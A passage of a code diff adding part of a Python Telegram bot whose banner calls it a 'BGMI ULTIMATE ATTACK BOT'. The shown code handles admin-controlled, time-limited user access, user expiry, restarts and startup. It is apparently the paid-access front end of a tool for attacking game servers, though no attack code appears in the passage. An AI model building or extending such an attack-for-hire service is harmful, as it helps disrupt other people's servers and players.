+        await cq.answer(P("⛔ Admin only!"), show_alert=True)
+        return
+    await state.set_state(AddUserState.waiting_input)
+    await cq.answer()
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="❌ Cancel", callback_data="cancel")]])
+    await send_msg(cq.message.chat.id, f"➕ {P('Send')}: <user_id> <minutes>", reply_markup=kb)
+
+@dp.message(AddUserState.waiting_input, F.text)
+async def handle_adduser_text(message: Message, state: FSMContext):
+    await state.clear()
+    if not is_admin(message.from_user.id):
+        return
+    args = message.text.split()
+    if len(args) != 2:
+        await send_msg(message.chat.id, P("Usage: <user_id> <minutes>"))
+        return
+    try:
+        uid, mins = int(args[0]), int(args[1])
+    except ValueError:
+        await send_msg(message.chat.id, P("❌ Invalid numbers!"))
+        return
+    AUTHORIZED_USERS[uid] = {"authorized_until": datetime.datetime.now() + datetime.timedelta(minutes=mins)}
+    save_authorized_users()
+    await send_msg(message.chat.id, P(f"✅ User {uid} added! ({mins} minutes access)"))
+
+@dp.callback_query(F.data == "removeuser")
+async def cb_removeuser(cq: CallbackQuery, state: FSMContext):
+    if not is_admin(cq.from_user.id):
+        await cq.answer(P("⛔ Admin only!"), show_alert=True)
+        return
+    await state.set_state(RemoveUserState.waiting_input)
+    await cq.answer()
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="❌ Cancel", callback_data="cancel")]])
+    await send_msg(cq.message.chat.id, f"➖ {P('Send user_id to remove')}:", reply_markup=kb)
+
+@dp.message(RemoveUserState.waiting_input, F.text)
+async def handle_removeuser_text(message: Message, state: FSMContext):
+    await state.clear()
+    if not is_admin(message.from_user.id):
+        return
+    try:
+        uid = int(message.text.strip())
+    except ValueError:
+        await send_msg(message.chat.id, P("❌ Invalid user_id!"))
+        return
+    if uid in AUTHORIZED_USERS:
+        del AUTHORIZED_USERS[uid]
+        save_authorized_users()
+        await send_msg(message.chat.id, P(f"✅ User {uid} removed."))
+    else:
+        await send_msg(message.chat.id, P(f"❌ User {uid} not found."))
+
+@dp.callback_query(F.data == "updateuser")
+async def cb_updateuser(cq: CallbackQuery, state: FSMContext):
+    if not is_admin(cq.from_user.id):
+        await cq.answer(P("⛔ Admin only!"), show_alert=True)
+        return
+    await state.set_state(UpdateUserState.waiting_input)
+    await cq.answer()
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="❌ Cancel", callback_data="cancel")]])
+    await send_msg(cq.message.chat.id, f"🔄 {P('Send')}: <user_id> <new_minutes>", reply_markup=kb)
+
+@dp.message(UpdateUserState.waiting_input, F.text)
+async def handle_updateuser_text(message: Message, state: FSMContext):
+    await state.clear()
+    if not is_admin(message.from_user.id):
+        return
+    args = message.text.split()
+    if len(args) != 2:
+        await send_msg(message.chat.id, P("Usage: <user_id> <new_minutes>"))
+        return
+    try:
+        uid, mins = int(args[0]), int(args[1])
+    except ValueError:
+        await send_msg(message.chat.id, P("❌ Invalid numbers!"))
+        return
+    if uid in AUTHORIZED_USERS:
+        AUTHORIZED_USERS[uid]["authorized_until"] = datetime.datetime.now() + datetime.timedelta(minutes=mins)
+        save_authorized_users()
+        await send_msg(message.chat.id, P(f"✅ User {uid} updated! ({mins} minutes)"))
+    else:
+        await send_msg(message.chat.id, P(f"❌ User {uid} not found."))
+
+@dp.callback_query(F.data == "listuser")
+async def cb_listuser(cq: CallbackQuery):
+    if not is_admin(cq.from_user.id):
+        await cq.answer(P("⛔ Admin only!"), show_alert=True)
+        return
+    await cq.answer()
+    if not AUTHORIZED_USERS:
+        txt = "📭 " + P("No authorized users")
+    else:
+        lines = [f"{uid} → {ud['authorized_until'].strftime('%Y-%m-%d %H:%M')}"
+                 for uid, ud in AUTHORIZED_USERS.items()]
+        txt = "👥 " + P("Authorized Users") + ":\n" + "\n".join(lines)
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🏠 Menu", callback_data="menu")]])
+    await send_msg(cq.message.chat.id, txt, reply_markup=kb)
+
+@dp.callback_query(F.data == "restart")
+async def cb_restart(cq: CallbackQuery):
+    if not is_admin(cq.from_user.id):
+        await cq.answer(P("⛔ Admin only!"), show_alert=True)
+        return
+    await cq.answer("🔄 Restarting...")
+    save_all()
+    await asyncio.sleep(1)
+    os.execl(sys.executable, sys.executable, *sys.argv)
+
+# ============================================================
+#  🔄 BACKGROUND TASK
+# ============================================================
+async def remove_expired_users():
+    while True:
+        for uid in list(AUTHORIZED_USERS.keys()):
+            if AUTHORIZED_USERS[uid]["authorized_until"] < datetime.datetime.now():
+                del AUTHORIZED_USERS[uid]
+                save_authorized_users()
+                log.info(f"Removed expired user: {uid}")
+        await asyncio.sleep(60)
+
+def banner():
+    print("""
+██████╗  ██████╗ ███╗   ███╗██╗    ██╗   ██╗████████╗██╗███╗   ███╗ █████╗ ████████╗███████╗
+██╔════╝ ██╔═══██╗████╗ ████║██║    ██║   ██║╚══██╔══╝██║████╗ ████║██╔══██╗╚══██╔══╝██╔════╝
+██║  ███╗██║   ██║██╔████╔██║██║    ██║   ██║   ██║   ██║██╔████╔██║███████║   ██║   █████╗
+██║   ██║██║   ██║██║╚██╔╝██║██║    ██║   ██║   ██║   ██║██║╚██╔╝██║██╔══██║   ██║   ██╔══╝
+╚██████╔╝╚██████╔╝██║ ╚═╝ ██║██║    ╚██████╔╝   ██║   ██║██║ ╚═╝ ██║██║  ██║   ██║   ███████╗
+ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═════╝    ╚═╝   ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝
+ 🔥 BGMI ULTIMATE ATTACK BOT v3 - Premium Effects | Referral | Buttons | Force Sub 🔥
+""")
+
+# ============================================================
+#  🚀 MAIN
+# ============================================================
+async def main():
+    global BOT_USERNAME
+    banner()
+    load_all()
+    try:
+        me = await bot.get_me()
+        BOT_USERNAME = me.username
+    except Exception:
+        BOT_USERNAME = "YOUR_BOT_USERNAME"
+
+    dp.message.middleware(ForceSubMiddleware())
+    dp.callback_query.middleware(ForceSubMiddleware())
+    asyncio.create_task(remove_expired_users())
+
+    log.info("Bot started. Press Ctrl+C to stop.")
+    await dp.start_polling(bot)
+
+if __name__ == "__main__":
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        print("\n[!] Bot stopped.")
